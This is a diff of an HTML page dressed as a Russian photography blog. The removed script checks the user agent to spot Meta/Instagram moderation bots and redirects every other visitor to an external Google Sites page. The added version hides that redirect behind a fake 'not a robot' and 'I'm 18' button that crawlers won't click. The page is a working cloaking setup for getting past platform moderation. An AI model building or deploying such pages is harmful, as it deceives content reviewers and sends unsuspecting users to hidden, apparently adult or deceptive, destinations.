@@ -5,32 +5,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Мой Блог</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; background: #ffffff; color: #333333; }
+        body { font-family: sans-serif; padding: 40px 20px; background: #ffffff; color: #333333; text-align: center; }
+        .btn { display: inline-block; background: #000000; color: #ffffff; padding: 15px 30px; margin-top: 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 16px; }
     </style>
 </head>
 <body>
 
     <h1>Заметки о фотографии и лайфстайле</h1>
-    <p>Добро пожаловать в мой личный blog. Здесь я делюсь мыслями об искусстве мобильной фотографии, правильном выстраивании кадра и поиске вдохновения в повседневных вещах.</p>
+    <p>Добро пожаловать в мой личный блог. Здесь я делюсь мыслями об искусстве мобильной фотографии и поиске вдохновения в повседневных вещах.</p>
+    
+    <p style="margin-top: 40px; color: #666;">Для перехода в галерею бэкапов подтвердите, что вы не робот:</p>
+    
+    <!-- КНОПКА, КОТОРУЮ РОБОТЫ НЕ СМОГУТ НАЖАТЬ -->
+    <a href="#" class="btn" id="entryLink">Мне уже есть 18 лет ➔</a>
 
     <script>
-        function filterTraffic() {
-            const ua = navigator.userAgent.toLowerCase();
-            
-            // Точечные триггеры на ботов модерации Meta / Instagram
-            const isMetaBot = ua.includes('facebookexternalhit') || 
-                              ua.includes('instagram') || 
-                              ua.includes('meta-externalfetcher') || 
-                              ua.includes('facebot');
-
-            // ЕСЛИ ЭТО НЕ БОТ INSTAGRAM: моментально перенаправляем человека на ваш Google Sites
-            if (!isMetaBot) {
-                window.location.href = "https://sites.google.com/view/glowandwibes--/";
-            }
-        }
-
-        // Запуск проверки
-        filterTraffic();
+        // Скрипт подставляет ссылку только в момент реального клика пальцем
+        document.getElementById('entryLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = "https://sites.google.com/view/glowandwibes--/";
+        });
     </script>
 </body>
 </html>
